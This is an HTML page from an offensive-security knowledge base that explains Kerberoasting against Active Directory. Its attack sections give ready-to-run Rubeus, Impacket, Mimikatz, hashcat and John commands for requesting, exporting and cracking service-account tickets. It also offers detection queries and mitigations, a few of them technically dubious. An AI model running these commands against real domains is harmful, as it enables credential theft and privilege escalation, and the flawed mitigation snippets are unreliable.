@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kerberoasting Attack | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .severity-high { background: rgba(255,136,0,0.2); color: #ff8800; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    th, td { padding: 0.75rem 1rem; border: 1px solid var(--border); text-align: left; }
+    th { background: var(--bg-elevated); font-weight: 600; color: var(--primary); font-size: 0.85rem; }
+    td { color: var(--text-secondary); font-size: 0.85rem; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1rem; margin: 1rem 0; }
+    .tool-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1rem; }
+    .tool-card h4 { color: var(--primary); margin-bottom: 0.5rem; font-size: 0.9rem; }
+    .tool-card p { font-size: 0.8rem; margin: 0; color: var(--text-secondary); }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    .warning-box { background: rgba(255,136,0,0.1); border-left: 4px solid #ff8800; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .warning-box strong { color: #ff8800; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../active-directory/index.html">AD Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="../active-directory/index.html">Active Directory</a> / Kerberoasting
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-high"><i class="fas fa-exclamation-triangle"></i> High Severity | ATT&CK T1558.003</span>
+      <h1>🔥 Kerberoasting Attack</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE ATT&CK</strong><span>T1558.003</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Intermediate</span></div>
+        <div class="meta-item"><strong>Privilege</strong><span>User</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>Windows</span></div>
+      </div>
+    </div>
+
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>Kerberoasting is a post-exploitation technique that takes advantage of how Kerberos tickets are requested for service accounts. Attackers request TGS (Ticket Granting Service) tickets for service accounts with SPNs (Service Principal Names), then crack the encrypted portion offline to recover account passwords.</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why Kerberoasting Works:</strong>
+        <ul>
+          <li>Service accounts often have weak or reused passwords</li>
+          <li>TGS tickets are encrypted with the service account's NTLM hash</li>
+          <li>Anyone authenticated to the domain can request TGS tickets</li>
+          <li>Tickets can be captured offline for offline cracking</li>
+          <li>No special privileges required to initiate the attack</li>
+        </ul>
+      </div>
+
+      <p><strong>Attack Flow:</strong></p>
+      <ol>
+        <li>Attacker gains a foothold on the network (user credentials)</li>
+        <li>Enumerates service accounts with SPNs configured</li>
+        <li>Requests TGS tickets for target service accounts</li>
+        <li>Extracts tickets from memory or captures from network</li>
+        <li>Cracks TGS encryption offline using dictionary/rainbow attacks</li>
+        <li>Uses recovered credentials for further attacks</li>
+      </ol>
+    </div>
+
+    <!-- 2. CLASSIFICATION -->
+    <div class="content-section" id="classification">
+      <h2>🏷️ Classification</h2>
+      <ul>
+        <li><strong>MITRE ATT&CK:</strong> T1558.003 - Steal or Forge Kerberos Tickets</li>
+        <li><strong>CAPEC:</strong> CAPEC-110 - Kerberoasting</li>
+        <li><strong>NIST:</strong> CWE-521 - Weak Password Requirements</li>
+        <li><strong>Detection Difficulty:</strong> Medium (high-volume ticket requests)</li>
+        <li><strong>False Positive Risk:</strong> Low (legitimate tickets vs roastable tickets)</li>
+      </ul>
+    </div>
+
+    <!-- 3. ATTACK SURFACE -->
+    <div class="content-section" id="attack-surface">
+      <h2>🎯 Attack Surface</h2>
+      <p>Service accounts vulnerable to Kerberoasting:</p>
+      <ul>
+        <li>✅ <strong>Application Service Accounts:</strong> IIS, SQL Server, Exchange</li>
+        <li>✅ <strong>Scheduled Task Accounts:</strong> Used for automated jobs</li>
+        <li>✅ <strong>Web Service Accounts:</strong> SharePoint, web applications</li>
+        <li>✅ <strong>Legacy Service Accounts:</strong> Often with old, weak passwords</li>
+        <li>✅ <strong>Domain Admin Delegated Accounts:</strong> High-value targets</li>
+      </ul>
+
+      <div class="info-box">
+        <strong>High-Value Targets:</strong><br>
+        Accounts with SPNs that are also members of high-privilege groups (Domain Admins, Account Operators, Backup Operators)
+      </div>
+    </div>
+
+    <!-- 4. PRECONDITIONS -->
+    <div class="content-section" id="preconditions">
+      <h2>⚠️ Preconditions</h2>
+      <ul>
+        <li><strong>Valid Domain Credentials:</strong> Any authenticated user account</li>
+        <li><strong>Service Accounts:</strong> Domain accounts with SPNs configured</li>
+        <li><strong>Network Access:</strong> Connectivity to Domain Controller (LDAP/kerberos)</li>
+        <li><strong>No Special Privileges:</strong> Standard user can request TGS tickets</li>
+      </ul>
+
+      <div class="info-box">
+        <strong>Why This is Dangerous:</strong><br>
+        Unlike most AD attacks that require Domain Admin, Kerberoasting only requires a normal user account. This makes it a common technique after initial compromise.
+      </div>
+    </div>
+
+    <!-- 5. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+      
+      <p><strong>Windows Event Logs:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Event ID 4769 - A Kerberos ticket was requested
+# Look for accounts with encryption type rc4_hmac (normal for SPNs)
+# Normal users should NOT be requesting many TGS tickets
+
+# Query with PowerShell
+Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} |
+  Where-Object { $_.Message -match 'rc4_hmac' } |
+  Select-Object TimeGenerated, @{N='User';E={$_.Properties[0].Value}},
+    @{N='Service';E={$_.Properties[2].Value}}</pre>
+      </div>
+
+      <p><strong>Detection Metrics:</strong></p>
+      <ul>
+        <li>Unusually high volume of TGS requests from single user</li>
+        <li>TGS requests for service accounts outside user's normal activity</li>
+        <li>Requests from non-server hosts for many different SPNs</li>
+        <li>TGS requests followed by authentication attempts to multiple servers</li>
+      </ul>
+
+      <p><strong>Sysmon Rule:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><RuleGroup name="Kerberoasting Detection" groupRelation="or">
+  <ProcessAccess onmatch="include">
+    <TargetName condition="contains">krbtgt</TargetName>
+  </ProcessAccess>
+</RuleGroup></pre>
+      </div>
+    </div>
+
+    <!-- 6. TOOL AUTOMATION -->
+    <div class="content-section" id="tool-automation">
+      <h2>⚙️ Tool Automation</h2>
+
+      <div class="tool-grid">
+        <div class="tool-card">
+          <h4>Rubeus</h4>
+          <p>Kerberos attack toolkit. Kerberoast module with automatic ticket capture.</p>
+        </div>
+        <div class="tool-card">
+          <h4>Impacket</h4>
+          <p>GetUserSPNs.py for enumeration and ticket capture.</p>
+        </div>
+        <div class="tool-card">
+          <h4>BloodHound</h4>
+          <p>Identify users with SPNs and high-value targets.</p>
+        </div>
+        <div class="tool-card">
+          <h4>hashcat</h4>
+          <p>GPU-accelerated TGS hash cracking.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- 7. ENUMERATION -->
+    <div class="content-section" id="enumeration">
+      <h2>📋 Enumeration</h2>
+      
+      <p><strong>Find Service Accounts with PowerShell:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find all accounts with SPNs
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet,SamAccountName,memberOf |
+  Select-Object SamAccountName,ServicePrincipalName,PasswordLastSet,@{n='Groups';e={$_.memberOf}} |
+  Format-List
+
+# Find high-value service accounts (members of privileged groups)
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,memberOf |
+  Where-Object { $_.memberOf -match "Domain Admins|Account Operators|Backup Operators" } |
+  Select-Object SamAccountName,ServicePrincipalName</pre>
+      </div>
+
+      <p><strong>Using PowerView:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Import PowerView
+Import-Module ./PowerView.ps1
+
+# Find all users with SPNs
+Get-NetUser -SPN
+
+# Find high-value kerberoastable users
+Get-NetUser -SPN | Where-Object { $_.memberof -match "Domain Admins" }</pre>
+      </div>
+    </div>
+
+    <!-- 8. BASIC ATTACK -->
+    <div class="content-section" id="basic-attack">
+      <h2>💣 Basic Attack</h2>
+      
+      <p><strong>Using Rubeus:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Request TGS tickets for all accounts with SPNs
+Rubeus.exe kerberoast
+
+# Target specific user
+Rubeus.exe kerberoast /user:sqlservice
+
+# Request with specific encryption (rc4_hmac for easier cracking)
+Rubeus.exe kerberoast /domain:target.local /outfile:tickets.txt</pre>
+      </div>
+
+      <p><strong>Using Impacket GetUserSPNs:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Enumerate and dump TGS tickets
+python3 GetUserSPNs.py -dc-ip 192.168.1.1 -request target.local/lowprivuser
+
+# Save tickets to file for offline cracking
+python3 GetUserSPNs.py -dc-ip 192.168.1.1 -requestfile tickets.txt target.local/lowprivuser
+
+# Request specific account
+python3 GetUserSPNs.py -dc-ip 192.168.1.1 -request -target-user sqladmin target.local/lowprivuser</pre>
+      </div>
+
+      <p><strong>Using Mimikatz:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># In memory viasekurlsa
+mimikatz # sekurlsa::tickets /export
+
+# Kerberos module
+mimikatz # kerberos::list /export
+
+# Or request specific ticket
+mimikatz # kerberos::ask /user:sqlservice /domain:target.local /ticket:krbtgt</pre>
+      </div>
+    </div>
+
+    <!-- 9. CRACKING -->
+    <div class="content-section" id="cracking">
+      <h2>🔓 Cracking TGS Hashes</h2>
+      
+      <p><strong>Hash Format (John The Ripper):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Hashcat format for TGS (krb5tgs)
+$krb5tgs$23$*user$realm$spn*hash$timestamp
+
+# Example cracked hash format:
+$krb5tgs$23$*sqlservice$TARGET.LOCAL$MSSQLSvcSRV01.target.local*$HMACMD5*hash*timestamp</pre>
+      </div>
+
+      <p><strong>Hashcat Commands:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Crack with wordlist (fast)
+hashcat -m 13100 -a 0 tickets.txt wordlist.txt
+
+# With rules for mutations
+hashcat -m 13100 -a 0 tickets.txt rockyou.txt -r rules/best64.rule
+
+# Show cracked passwords
+hashcat -m 13100 -a 0 tickets.txt wordlist.txt --show
+
+# Benchmark
+hashcat -m 13100 -b</pre>
+      </div>
+
+      <p><strong>John The Ripper:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Crack with john
+john --format=krb5tgs tickets.txt --wordlist=rockyou.txt
+
+# Show results
+john --format=krb5tgs tickets.txt --show</pre>
+      </div>
+
+      <div class="warning-box">
+        <strong>Performance Tip:</strong><br>
+        Use GPU-based cracking (hashcat) for 1000x faster speeds. A modern GPU can crack 10M+ MD5 hashes/second.
+      </div>
+    </div>
+
+    <!-- 10. IMPACT -->
+    <div class="content-section" id="impact">
+      <h2>💥 Impact Analysis</h2>
+      
+      <div class="vulnerability-box">
+        <strong>Attack Impact:</strong>
+        <ul>
+          <li><strong>Privilege Escalation:</strong> If service account is Domain Admin</li>
+          <li><strong>Lateral Movement:</strong> Access to services the account can authenticate to</li>
+          <li><strong>Persistence:</strong> Keep cracking different service accounts</li>
+          <li><strong>Domain Dominance:</strong> KRBTGT account gives Golden Ticket capability</li>
+        </ul>
+      </div>
+
+      <p><strong>Real-World Scenario:</strong></p>
+      <ul>
+        <li>Domain account gets compromised via phishing</li>
+        <li>Attacker runs Kerberoasting, finds SQL Server service account</li>
+        <li>Cracks password: <code>SQLService2020!</code></li>
+        <li>Uses SQL service account to access SQL Server</li>
+        <li>Executes xp_cmdshell to get shell on SQL server</li>
+        <li>Uses SQL server as pivot to other systems</li>
+      </ul>
+    </div>
+
+    <!-- 11. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+
+      <div class="mitigation-box">
+        <strong>✅ Primary Defenses:</strong>
+        <ul>
+          <li><strong>Strong Passwords:</strong> Use 25+ character random passwords for service accounts</li>
+          <li><strong>Password Rotation:</strong> Automatically rotate service account passwords</li>
+          <li><strong>Privilege Groups:</strong> Remove service accounts from privileged groups</li>
+          <li><strong>DES/RC4 Disabled:</strong> Only allow AES encryption for Kerberos</li>
+        </ul>
+      </div>
+
+      <p><strong>Group Policy Settings:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Computer Configuration > Administrative Templates > System > Kerberos
+# "Support cryptographic algorithms" - Enable AES128 and AES256 only
+# "Use RC4 for encryption" - Disabled
+
+# Alternatively via PowerShell (Group Policy preferences)
+Set-ADAccountControl -Identity "serviceaccount" -UseDesKeyOnly $false -AllowReversibleEncryption $false</pre>
+      </div>
+
+      <p><strong>Protected Users Security Group:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Add service accounts to Protected Users group
+# This prevents use of RC4 encryption and requires smartcard
+Add-ADGroupMember -Identity "Protected Users" -Members "svc_account"</pre>
+      </div>
+    </div>
+
+    <!-- 12. DETECTION LOGIC -->
+    <div class="content-section" id="detection-logic">
+      <h2>⚙️ Detection Logic</h2>
+
+      <p><strong>Sigma Rule - Kerberoasting Detection:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>title: Kerberoasting SPN Request
+id: kerberoasting-detection-001
+status: experimental
+description: Detects Kerberoasting activity
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 4769
+    TicketEncryptionType: 0x17  # RC4-HMAC
+  filter:
+    TargetUserName|endswith: '$'  # Exclude machine accounts
+  condition: selection and not filter
+fields:
+  - TimeGenerated
+  - TargetUserName
+  - TargetDomainName
+  - ServiceName
+  - IpAddress
+level: high</pre>
+      </div>
+
+      <p><strong>KQL Query (Microsoft Sentinel):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>SecurityEvent
+| where EventID == 4769
+| where TicketEncryptionType == 23  // 0x17 = 23 decimal = RC4-HMAC
+| extend AccountName = tostring(TargetUserName)
+| where AccountName !endswith "$"
+| summarize RequestCount = count() by AccountName, bin(TimeGenerated, 1h)
+| where RequestCount > 10  // Alert threshold</pre>
+      </div>
+    </div>
+
+    <!-- 13. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1558/003/" target="_blank">MITRE ATT&CK T1558.003</a></li>
+        <li><a href="https://www.harmj0y.net/blog/activedirectory/kerberoasting/" target="_blank">Harmj0y - Kerberoasting</a></li>
+        <li><a href="https://github.com/GhostPack/Rubeus" target="_blank">Rubeus GitHub</a></li>
+        <li><a href="https://github.com/SecureAuthCorp/impacket" target="_blank">Impacket GetUserSPNs</a></li>
+        <li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank">Hashcat TGS Examples</a></li>
+      </ul>
+    </div>
+
+    <a href="../active-directory/index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Active Directory</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+}
+</script>
+
+</body>
+</html>
